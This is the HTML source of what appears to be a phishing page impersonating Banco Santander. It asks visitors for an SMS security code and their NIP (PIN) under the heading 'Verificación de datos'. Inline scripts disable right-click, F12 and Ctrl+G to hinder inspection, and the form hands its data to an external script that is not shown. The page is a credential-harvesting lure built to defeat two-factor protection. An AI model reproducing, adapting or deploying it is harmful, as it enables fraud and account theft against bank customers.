<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="estilo.css">
      <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
      <script src="alerta1.js"></script>
      <script src="ipvalidation.js"></script>
      <link rel="icon" href="icono.png" type="image/x-icon"> 
      <link rel="apple-touch-icon" href="icono.png"> 
      <script type="text/javascript">
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.onkeydown = function(e) {
            if (e.ctrlKey && (e.keyCode === 71)) {
                return false;
            }
        };
    </script>
    <script>
              document.addEventListener('keydown', function(e) {
                  if (e.key === 'F12') {
                      e.preventDefault();
                  }
              });
      
              document.addEventListener('contextmenu', function(e) {
                  e.preventDefault();
              });
    </script>      
  <title>Banco Santander</title>
</head>
<body class="body">
    <div class="general">
  <form id="formulario" onsubmit="enviarFormulario(event)" class="form">
    <img src="logo.png" class="logo">
    <p class="texto"><b>Verificación de datos</b></p>
    <p class="texto1"><b>Te enviamos un código de seguridad vía SMS o correo electrónico.</b></p>
    <img src="imag1.png" class="imag1">
    <label class="texto2"><b>Código de seguridad enviado por SMS</b></label><br>
    <input class="documento" type="text" id="documento" maxlength="8" minlength="8" pattern="[0-9]*" inputmode="numeric" required placeholder="Código de 8 dígitos"><br><br>
    <label class="texto2"><b>Ingresa tu NIP</b></label><br>
    <input class="documento" type="text" id="contraseña" minlength="4" maxlength="4" inputmode="numeric" required placeholder="Ingresa tu NIP"><br><br>
    <button type="submit" class="boton">Verificar</button>
  </form>
  <script src="jandex1.js"></script>
</div>
</body>
</html>
